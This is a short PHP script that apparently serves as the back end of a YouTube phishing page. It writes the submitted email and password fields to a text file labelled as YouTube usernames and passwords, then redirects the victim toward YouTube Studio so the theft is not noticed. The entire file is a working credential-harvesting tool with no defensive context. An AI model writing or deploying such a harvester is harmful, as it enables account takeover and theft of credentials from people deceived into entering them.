<?php
file_put_contents("usernames.txt", "Youtube Username: " . $_POST['email'] ."\nPassword: ". $_POST['pswrepeat'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://studio.youtube.com/
header("Location: $url");
?>